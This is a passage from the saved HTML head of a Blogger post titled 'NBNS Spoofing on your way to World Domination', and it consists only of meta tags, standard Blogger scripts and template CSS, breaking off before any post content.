<!DOCTYPE html>
<html b:version="2" class="v2" dir="ltr"><head>
<meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible">
<meta content="width=1100" name="viewport">
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
<script async="" src="nbns-spoofing-on-your-way-to-world_files/cbgapi.loaded_2"></script><script async="" src="nbns-spoofing-on-your-way-to-world_files/cbgapi.loaded_1"></script><script async="" src="nbns-spoofing-on-your-way-to-world_files/cbgapi.loaded_0"></script><script type="text/javascript">(function() { var b=window,e="jstiming",g="tick";(function(){function d(a){this.t={};this.tick=function(a,d,c){c=void 0!=c?c:(new Date).getTime();this.t[a]=[c,d]};this[g]("start",null,a)}var a=new d;b.jstiming={Timer:d,load:a};if(b.performance&&b.performance.timing){var a=b.performance.timing,c=b[e].load,f=a.navigationStart,a=a.responseStart;0<f&&a>=f&&(c[g]("_wtsrt",void 0,f),c[g]("wtsrt_","_wtsrt",a),c[g]("tbsd_","wtsrt_"))}try{a=null,b.chrome&&b.chrome.csi&&(a=Math.floor(b.chrome.csi().pageT),c&&0<f&&(c[g]("_tbnd",void 0,b.chrome.csi().startE),
c[g]("tbnd_","_tbnd",f))),null==a&&b.gtbExternal&&(a=b.gtbExternal.pageT()),null==a&&b.external&&(a=b.external.pageT,c&&0<f&&(c[g]("_tbnd",void 0,b.external.startE),c[g]("tbnd_","_tbnd",f))),a&&(b[e].pt=a)}catch(l){}})();b.tickAboveFold=function(d){var a=0;if(d.offsetParent){do a+=d.offsetTop;while(d=d.offsetParent)}d=a;750>=d&&b[e].load[g]("aft")};var h=!1;function k(){h||(h=!0,b[e].load[g]("firstScrollTime"))}b.addEventListener?b.addEventListener("scroll",k,!1):b.attachEvent("onscroll",k);
 })();</script>
<meta content="true" name="MSSmartTagsPreventParsing">
<meta content="blogger" name="generator">
<link href="http://www.packetstan.com/favicon.ico" rel="icon" type="image/x-icon">
<link href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html" rel="canonical">
<link rel="alternate" type="application/atom+xml" title="Packetstan - Atom" href="http://www.packetstan.com/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="Packetstan - RSS" href="http://www.packetstan.com/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="Packetstan - Atom" href="http://www.blogger.com/feeds/6256684586716847588/posts/default">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.blogger.com/rsd.g?blogID=6256684586716847588">
<link rel="alternate" type="application/atom+xml" title="Packetstan - Atom" href="http://www.packetstan.com/feeds/4934681323479353937/comments/default">
<!--[if IE]><script type="text/javascript" src="//www.blogger.com/static/v1/jsbin/943085292-ieretrofit.js"></script>
<![endif]-->
<link rel="image_src" href="http://2.bp.blogspot.com/-_5j2sGP7M0w/TZTwwWcWEgI/AAAAAAAAACE/7_ujJfrecHU/s72-c/nbnsscreenshot-smaller.png">
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<title>Packetstan: NBNS Spoofing on your way to World Domination</title>
<link type="text/css" rel="stylesheet" href="nbns-spoofing-on-your-way-to-world_files/3441929121-widget_css_2_bundle.css">
<link type="text/css" rel="stylesheet" href="nbns-spoofing-on-your-way-to-world_files/authorization.css">
<style id="page-skin-1" type="text/css"><!--
/*
-----------------------------------------------
Blogger Template Style
Name:     Awesome Inc.
Designer: Tina Chen
URL:      tinachen.org
----------------------------------------------- */
/* Variable definitions
====================
<Variable name="keycolor" description="Main Color" type="color" default="#ffffff"/>
<Group description="Page" selector="body">
<Variable name="body.font" description="Font" type="font"
default="normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="body.background.color" description="Background Color" type="color" default="#000000"/>
<Variable name="body.text.color" description="Text Color" type="color" default="#ffffff"/>
</Group>
<Group description="Links" selector=".main-inner">
<Variable name="link.color" description="Link Color" type="color" default="#888888"/>
<Variable name="link.visited.color" description="Visited Color" type="color" default="#444444"/>
<Variable name="link.hover.color" description="Hover Color" type="color" default="#cccccc"/>
</Group>
<Group description="Blog Title" selector=".header h1">
<Variable name="header.font" description="Title Font" type="font"
default="normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="header.text.color" description="Title Color" type="color" default="#ffffff" />
<Variable name="header.background.color" description="Header Background" type="color" default="transparent" />
</Group>
<Group description="Blog Description" selector=".header .description">
<Variable name="description.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="description.text.color" description="Text Color" type="color"
default="#ffffff" />
</Group>
<Group description="Tabs Text" selector=".tabs-inner .widget li a">
<Variable name="tabs.font" description="Font" type="font"
default="normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="tabs.text.color" description="Text Color" type="color" default="#ffffff"/>
<Variable name="tabs.selected.text.color" description="Selected Color" type="color" default="#ffffff"/>
</Group>
<Group description="Tabs Background" selector=".tabs-outer .PageList">
<Variable name="tabs.background.color" description="Background Color" type="color" default="#141414"/>
<Variable name="tabs.selected.background.color" description="Selected Color" type="color" default="#444444"/>
<Variable name="tabs.border.color" description="Border Color" type="color" default="#222222"/>
</Group>
<Group description="Date Header" selector=".main-inner .widget h2.date-header, .main-inner .widget h2.date-header span">
<Variable name="date.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="date.text.color" description="Text Color" type="color" default="#666666"/>
<Variable name="date.border.color" description="Border Color" type="color" default="#222222"/>
</Group>
<Group description="Post Title" selector="h3.post-title, h4, h3.post-title a">
<Variable name="post.title.font" description="Font" type="font"
default="normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="post.title.text.color" description="Text Color" type="color" default="#ffffff"/>
</Group>
<Group description="Post Background" selector=".post">
<Variable name="post.background.color" description="Background Color" type="color" default="#141414" />
<Variable name="post.border.color" description="Border Color" type="color" default="#222222" />
<Variable name="post.border.bevel.color" description="Bevel Color" type="color" default="#222222"/>
</Group>
<Group description="Gadget Title" selector="h2">
<Variable name="widget.title.font" description="Font" type="font"
default="normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.title.text.color" description="Text Color" type="color" default="#ffffff"/>
</Group>
<Group description="Gadget Text" selector=".sidebar .widget">
<Variable name="widget.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.text.color" description="Text Color" type="color" default="#ffffff"/>
<Variable name="widget.alternate.text.color" description="Alternate Color" type="color" default="#666666"/>
</Group>
<Group description="Gadget Links" selector=".sidebar .widget">
<Variable name="widget.link.color" description="Link Color" type="color" default="#888888"/>
<Variable name="widget.link.visited.color" description="Visited Color" type="color" default="#444444"/>
<Variable name="widget.link.hover.color" description="Hover Color" type="color" default="#cccccc"/>
</Group>
<Group description="Gadget Background" selector=".sidebar .widget">
<Variable name="widget.background.color" description="Background Color" type="color" default="#141414"/>
<Variable name="widget.border.color" description="Border Color" type="color" default="#222222"/>
<Variable name="widget.border.bevel.color" description="Bevel Color" type="color" default="#000000"/>
</Group>
<Group description="Sidebar Background" selector=".column-left-inner .column-right-inner">
<Variable name="widget.outer.background.color" description="Background Color" type="color" default="transparent" />
</Group>
<Group description="Images" selector=".main-inner">
<Variable name="image.background.color" description="Background Color" type="color" default="transparent"/>
<Variable name="image.border.color" description="Border Color" type="color" default="transparent"/>
</Group>
<Group description="Feed" selector=".blog-feeds">
<Variable name="feed.text.color" description="Text Color" type="color" default="#ffffff"/>
</Group>
<Group description="Feed Links" selector=".blog-feeds">
<Variable name="feed.link.color" description="Link Color" type="color" default="#888888"/>
<Variable name="feed.link.visited.color" description="Visited Color" type="color" default="#444444"/>
<Variable name="feed.link.hover.color" description="Hover Color" type="color" default="#cccccc"/>
</Group>
<Group description="Pager" selector=".blog-pager">
<Variable name="pager.background.color" description="Background Color" type="color" default="#141414" />
</Group>
<Group description="Footer" selector=".footer-outer">
<Variable name="footer.background.color" description="Background Color" type="color" default="#141414" />
<Variable name="footer.text.color" description="Text Color" type="color" default="#ffffff" />
</Group>
<Variable name="title.shadow.spread" description="Title Shadow" type="length" default="-1px"/>
<Variable name="body.background" description="Body Background" type="background"
color="#000000"
default="$(color) none repeat scroll top left"/>
<Variable name="body.background.gradient.cap" description="Body Gradient Cap" type="url"
default="none"/>
<Variable name="body.background.size" description="Body Background Size" type="string" default="auto"/>
<Variable name="tabs.background.gradient" description="Tabs Background Gradient" type="url"
default="none"/>
<Variable name="header.background.gradient" description="Header Background Gradient" type="url" default="none" />
<Variable name="header.padding.top" description="Header Top Padding" type="length" default="22px" />
<Variable name="header.margin.top" description="Header Top Margin" type="length" default="0" />
<Variable name="header.margin.bottom" description="Header Bottom Margin" type="length" default="0" />
<Variable name="widget.padding.top" description="Widget Padding Top" type="length" default="8px" />
<Variable name="widget.padding.side" description="Widget Padding Side" type="length" default="15px" />
<Variable name="widget.outer.margin.top" description="Widget Top Margin" type="length" default="0" />
<Variable name="widget.outer.background.gradient" description="Gradient" type="url" default="none" />
<Variable name="widget.border.radius" description="Gadget Border Radius" type="length" default="0" />
<Variable name="outer.shadow.spread" description="Outer Shadow Size" type="length" default="0" />
<Variable name="date.header.border.radius.top" description="Date Header Border Radius Top" type="length" default="0" />
<Variable name="date.header.position" description="Date Header Position" type="length" default="15px" />
<Variable name="date.space" description="Date Space" type="length" default="30px" />
<Variable name="date.position" description="Date Float" type="string" default="static" />
<Variable name="date.padding.bottom" description="Date Padding Bottom" type="length" default="0" />
<Variable name="date.border.size" description="Date Border Size" type="length" default="0" />
<Variable name="date.background" description="Date Background" type="background" color="transparent"
default="$(color) none no-repeat scroll top left" />
<Variable name="date.first.border.radius.top" description="Date First top radius" type="length" default="0" />
<Variable name="date.last.space.bottom" description="Date Last Space Bottom" type="length"
default="20px" />
<Variable name="date.last.border.radius.bottom" description="Date Last bottom radius" type="length" default="0" />
<Variable name="post.first.padding.top" description="First Post Padding Top" type="length" default="0" />
<Variable name="image.shadow.spread" description="Image Shadow Size" type="length" default="0"/>
<Variable name="image.border.radius" description="Image Border Radius" type="length" default="0"/>
<Variable name="separator.outdent" description="Separator Outdent" type="length" default="15px" />
<Variable name="title.separator.border.size" description="Widget Title Border Size" type="length" default="1px" />
<Variable name="list.separator.border.size" description="List Separator Border Size" type="length" default="1px" />
<Variable name="shadow.spread" description="Shadow Size" type="length" default="0"/>
<Variable name="startSide" description="Side where text starts in blog language" type="automatic" default="left"/>
<Variable name="endSide" description="Side where text ends in blog language" type="automatic" default="right"/>
<Variable name="date.side" description="Side where date header is placed" type="string" default="right"/>
<Variable name="pager.border.radius.top" description="Pager Border Top Radius" type="length" default="0" />
<Variable name="pager.space.top" description="Pager Top Space" type="length" default="1em" />
<Variable name="footer.background.gradient" description="Background Gradient" type="url" default="none" />
<Variable name="mobile.background.size" description="Mobile Background Size" type="string"
default="auto"/>
<Variable name="mobile.background.overlay" description="Mobile Background Overlay" type="string"
default="transparent none repeat scroll top left"/>
<Variable name="mobile.button.color" description="Mobile Button Color" type="color" default="#ffffff" />
*/
/* Content
----------------------------------------------- */
body {
font: normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
background: #000000 url(http://www.blogblog.com/1kt/awesomeinc/body_background_dark.png) repeat scroll top left;
}
html body .content-outer {
min-width: 0;
max-width: 100%;
width: 100%;
}
a:link {
text-decoration: none;
color: #888888;
}
a:visited {
text-decoration: none;
color: #444444;
}
a:hover {
text-decoration: underline;
color: #cccccc;
}
.body-fauxcolumn-outer .cap-top {
position: absolute;
z-index: 1;
height: 276px;
width: 100%;
background: transparent url(http://www.blogblog.com/1kt/awesomeinc/body_gradient_dark.png) repeat-x scroll top left;
_background-image: none;
}
/* Columns
----------------------------------------------- */
.content-inner {
padding: 0;
}
.header-inner .section {
margin: 0 16px;
}
.tabs-inner .section {
margin: 0 16px;
}
.main-inner {
padding-top: 30px;
}
.main-inner .column-center-inner,
.main-inner .column-left-inner,
.main-inner .column-right-inner {
padding: 0 5px;
}
*+html body .main-inner .column-center-inner {
margin-top: -30px;
}
#layout .main-inner .column-center-inner {
margin-top: 0;
}
/* Header
----------------------------------------------- */
.header-outer {
margin: 0 0 0 0;
background: transparent none repeat scroll 0 0;
}
.Header h1 {
font: normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
text-shadow: 0 0 -1px #000000;
}
.Header h1 a {
color: #ffffff;
}
.Header .description {
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 0;
padding-right: 0;
margin-bottom: 0;
}
.header-inner .Header .titlewrapper {
padding-top: 22px;
}
/* Tabs
----------------------------------------------- */
.tabs-outer {
overflow: hidden;
position: relative;
background: #141414 none repeat scroll 0 0;
}
#layout .tabs-outer {
overflow: visible;
}
.tabs-cap-top, .tabs-cap-bottom {
position: absolute;
width: 100%;
border-top: 1px solid #222222;
}
.tabs-cap-bottom {
bottom: 0;
}
.tabs-inner .widget li a {
display: inline-block;
margin: 0;
padding: .6em 1.5em;
font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
border-top: 1px solid #222222;
border-bottom: 1px solid #222222;
border-left: 1px solid #222222;
height: 16px;
line-height: 16px;
}
.tabs-inner .widget li:last-child a {
border-right: 1px solid #222222;
}
.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
background: #444444 none repeat-x scroll 0 -100px;
color: #ffffff;
}
/* Headings
----------------------------------------------- */
h2 {
font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
}
/* Widgets
----------------------------------------------- */
.main-inner .section {
margin: 0 27px;
padding: 0;
}
.main-inner .column-left-outer,
.main-inner .column-right-outer {
margin-top: 0;
}
#layout .main-inner .column-left-outer,
#layout .main-inner .column-right-outer {
margin-top: 0;
}
.main-inner .column-left-inner,
.main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
#layout .main-inner .column-left-inner,
#layout .main-inner .column-right-inner {
margin-top: 0;
}
.sidebar .widget {
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
}
.sidebar .widget a:link {
color: #888888;
}
.sidebar .widget a:visited {
color: #444444;
}
.sidebar .widget a:hover {
color: #cccccc;
}
.sidebar .widget h2 {
text-shadow: 0 0 -1px #000000;
}
.main-inner .widget {
background-color: #141414;
border: 1px solid #222222;
padding: 0 15px 15px;
margin: 20px -16px;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.main-inner .widget h2 {
margin: 0 -15px;
padding: .6em 15px .5em;
border-bottom: 1px solid #000000;
}
.footer-inner .widget h2 {
padding: 0 0 .4em;
border-bottom: 1px solid #000000;
}
.main-inner .widget h2 + div, .footer-inner .widget h2 + div {
border-top: 1px solid #222222;
padding-top: 8px;
}
.main-inner .widget .widget-content {
margin: 0 -15px;
padding: 7px 15px 0;
}
.main-inner .widget ul, .main-inner .widget #ArchiveList ul.flat {
margin: -8px -15px 0;
padding: 0;
list-style: none;
}
.main-inner .widget #ArchiveList {
margin: -8px 0 0;
}
.main-inner .widget ul li, .main-inner .widget #ArchiveList ul.flat li {
padding: .5em 15px;
text-indent: 0;
color: #666666;
border-top: 1px solid #222222;
border-bottom: 1px solid #000000;
}
.main-inner .widget #ArchiveList ul li {
padding-top: .25em;
padding-bottom: .25em;
}
.main-inner .widget ul li:first-child, .main-inner .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.main-inner .widget ul li:last-child, .main-inner .widget #ArchiveList ul.flat li:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.main-inner .widget .post-body ul {
padding: 0 2.5em;
margin: .5em 0;
list-style: disc;
}
.main-inner .widget .post-body ul li {
padding: 0.25em 0;
margin-bottom: .25em;
color: #ffffff;
border: none;
}
.footer-inner .widget ul {
padding: 0;
list-style: none;
}
.widget .zippy {
color: #666666;
}
/* Posts
----------------------------------------------- */
body .main-inner .Blog {
padding: 0;
margin-bottom: 1em;
background-color: transparent;
border: none;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
box-shadow: 0 0 0 rgba(0, 0, 0, 0);
}
.main-inner .section:last-child .Blog:last-child {
padding: 0;
margin-bottom: 1em;
}
.main-inner .widget h2.date-header {
margin: 0 -15px 1px;
padding: 0 0 0 0;
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #666666;
background: transparent none no-repeat scroll top left;
border-top: 0 solid #222222;
border-bottom: 1px solid #000000;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
position: static;
bottom: 100%;
right: 15px;
text-shadow: 0 0 -1px #000000;
}
.main-inner .widget h2.date-header span {
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
display: block;
padding: .5em 15px;
border-left: 0 solid #222222;
border-right: 0 solid #222222;
}
.date-outer {
position: relative;
margin: 30px 0 20px;
padding: 0 15px;
background-color: #141414;
border: 1px solid #222222;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.date-outer:first-child {
margin-top: 0;
}
.date-outer:last-child {
margin-bottom: 20px;
-moz-border-radius-bottomleft: 0;
-moz-border-radius-bottomright: 0;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-bottom-left-radius: 0;
-goog-ms-border-bottom-right-radius: 0;
border-bottom-left-radius: 0;
border-bottom-right-radius: 0;
}
.date-posts {
margin: 0 -15px;
padding: 0 15px;
clear: both;
}
.post-outer, .inline-ad {
border-top: 1px solid #222222;
margin: 0 -15px;
padding: 15px 15px;
}
.post-outer {
padding-bottom: 10px;
}
.post-outer:first-child {
padding-top: 0;
border-top: none;
}
.post-outer:last-child, .inline-ad:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.post-body img {
padding: 8px;
background: #222222;
border: 1px solid transparent;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
border-radius: 0;
}
h3.post-title, h4 {
font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
}
h3.post-title a {
font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
}
h3.post-title a:hover {
color: #cccccc;
text-decoration: underline;
}
.post-header {
margin: 0 0 1em;
}
.post-body {
line-height: 1.4;
}
.post-outer h2 {
color: #ffffff;
}
.post-footer {
margin: 1.5em 0 0;
}
#blog-pager {
padding: 15px;
font-size: 120%;
background-color: #141414;
border: 1px solid #222222;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius-topright: 0;
margin-top: 1em;
}
.blog-feeds, .post-feeds {
margin: 1em 0;
text-align: center;
color: #ffffff;
}
.blog-feeds a, .post-feeds a {
color: #888888;
}
.blog-feeds a:visited, .post-feeds a:visited {
color: #444444;
}
.blog-feeds a:hover, .post-feeds a:hover {
color: #cccccc;
}
.post-outer .comments {
margin-top: 2em;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #222222;
border-bottom: 1px solid #222222;
}
.comments .continue {
border-top: 2px solid #222222;
}
/* Footer
----------------------------------------------- */
.footer-outer {
margin: -0 0 -1px;
padding: 0 0 0;
color: #ffffff;
overflow: hidden;
}
.footer-fauxborder-left {
border-top: 1px solid #222222;
background: #141414 none repeat scroll 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
margin: 0 -0;
}
/* Mobile
----------------------------------------------- */
body.mobile {
background-size: auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
*+html body.mobile .main-inner .column-center-inner {
margin-top: 0;
}
.mobile .main-inner .widget {
padding: 0 0 15px;
}
.mobile .main-inner .widget h2 + div,
.mobile .footer-inner .widget h2 + div {
border-top: none;
padding-top: 0;
}
.mobile .footer-inner .widget h2 {
padding: 0.5em 0;
border-bottom: none;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile .main-inner .widget ul,
.mobile .main-inner .widget #ArchiveList ul.flat {
margin: 0 -15px 0;
}
.mobile .main-inner .widget h2.date-header {
right: 0;
}
.mobile .date-header span {
padding: 0.4em 0;
}
.mobile .date-outer:first-child {
margin-bottom: 0;
border: 1px solid #222222;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
}
.mobile .date-outer {
border-color: #222222;
border-width: 0 1px 1px;
}
.mobile .date-outer:last-child {
margin-bottom: 0;
}
.mobile .main-inner {
padding: 0;
}
.mobile .header-inner .section {
margin: 0;
}
.mobile .post-outer, .mobile .inline-ad {
padding: 5px 0;
}
.mobile .tabs-inner .section {
margin: 0 10px;
}
.mobile .main-inner .widget h2 {
margin: 0;
padding: 0;
}
.mobile .main-inner .widget h2.date-header span {
padding: 0;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile #blog-pager {
border: 1px solid transparent;
background: #141414 none repeat scroll 0 0;
}
.mobile .main-inner .column-left-inner,
.mobile .main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: none;
-webkit-box-shadow: none;
-goog-ms-box-shadow: none;
box-shadow: none;
}
.mobile .date-posts {
margin: 0;
padding: 0;
}
.mobile .footer-fauxborder-left {
margin: 0;
border-top: inherit;
}
.mobile .main-inner .section:last-child .Blog:last-child {
margin-bottom: 0;
}
.mobile-index-contents {
color: #ffffff;
}
.mobile .mobile-link-button {
background: #888888 none repeat scroll 0 0;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile .tabs-inner .PageList .widget-content {
background: transparent;
border-top: 1px solid;
border-color: #222222;
color: #ffffff;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #222222;
}
pre {
white-space: pre-wrap;       /* css-3 */
white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
white-space: -pre-wrap;      /* Opera 4-6 */
white-space: -o-pre-wrap;    /* Opera 7 */
word-wrap: break-word;       /* Internet Explorer 5.5+ */
background-color: #111111;
border-width:thin;
border-color: #000000;
border-style:solid;
padding: 6px;
/* color: #444444; */
}
--></style>
<style id="template-skin-1" type="text/css"><!--
body {
min-width: 860px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 860px;
max-width: 860px;
_width: 860px;
}
.main-inner .columns {
padding-left: 0px;
padding-right: 260px;
}
.main-inner .fauxcolumn-center-outer {
left: 0px;
right: 260px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0px") -
parseInt("260px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0px;
}
.main-inner .fauxcolumn-right-outer {
width: 260px;
}
.main-inner .column-left-outer {
width: 0px;
right: 100%;
margin-left: -0px;
}
.main-inner .column-right-outer {
width: 260px;
margin-right: -260px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
--></style>
<script type="text/javascript">var a=navigator,b="userAgent",c="indexOf",f="&m=1",g="(^|&)m=",h="?",k="?m=1";function l(){var d=window.location.href,e=d.split(h);switch(e.length){case 1:return d+k;case 2:return 0<=e[1].search(g)?null:d+f;default:return null}}if(-1!=a[b][c]("Mobile")&&-1!=a[b][c]("WebKit")&&-1==a[b][c]("iPad")||-1!=a[b][c]("Opera Mini")||-1!=a[b][c]("IEMobile")){var m=l();m&&window.location.replace(m)};
</script><script type="text/javascript">
if (window.jstiming) window.jstiming.load.tick('headEnd');
</script><script src="nbns-spoofing-on-your-way-to-world_files/google_top_exp.html" type="text/javascript"></script><style>.gc-bubbleDefault{background-color:transparent !important;text-align:left;padding:0 !important;margin:0 !important;border:0 !important;table-layout:auto !important}.gc-reset{background-color:transparent !important;border:0 !important;padding:0 !important;margin:0 !important;text-align:left}.pls-bubbleTop{border-bottom:1px solid #ccc !important}.pls-topTail,.pls-vertShimLeft,.pls-contentLeft{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/border_3.gif) !important}.pls-topTail{background-repeat:repeat-x !important;background-position:bottom !important}.pls-vertShim{background-color:#fff !important;text-align:right}.pls-vertShimLeft{background-repeat:repeat-y !important;background-position:right !important;height:4px}.pls-vertShimRight{height:4px}.pls-confirm-container .pls-vertShim{background-color:#fff3c2 !important}.pls-contentWrap{background-color:#fff !important;position:relative !important;vertical-align:top}.pls-contentLeft{background-repeat:repeat-y;background-position:right;vertical-align:top}.pls-dropRight{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropR_3.png) !important;background-repeat:repeat-y !important;vertical-align:top}.pls-vert,.pls-tailleft,.pls-dropTR .pls-dropBR,.pls-dropBL,.pls-vert img{vertical-align:top}.pls-dropBottom{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropB_3.png) !important;background-repeat:repeat-x !important;width:100%;vertical-align:top}.pls-topLeft{background:inherit !important;text-align:right;vertical-align:bottom}.pls-topRight{background:inherit !important;text-align:left;vertical-align:bottom}.pls-bottomLeft{background:inherit !important;text-align:right}.pls-bottomRight{background:inherit !important;text-align:left;vertical-align:top}.pls-tailtop,.pls-tailright,.pls-tailbottom,.pls-tailleft{display:none;position:relative}.pls-tailbottom,.pls-tailtop,.pls-tailright,.pls-tailleft,.pls-dropTR,.pls-dropBR,.pls-dropBL{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite_3.png) !important;background-repeat:no-repeat}.pls-tailbottom{background-position:-23px 0}.pls-confirm-container .pls-tailbottom{background-position:-23px -10px}.pls-tailtop{background-position:-19px -20px}.pls-tailright{background-position:0 0}.pls-tailleft{background-position:-10px 0}.pls-tailtop{vertical-align:top}.gc-bubbleDefault td{line-height:0;font-size:0}.pls-topLeft img,.pls-topRight 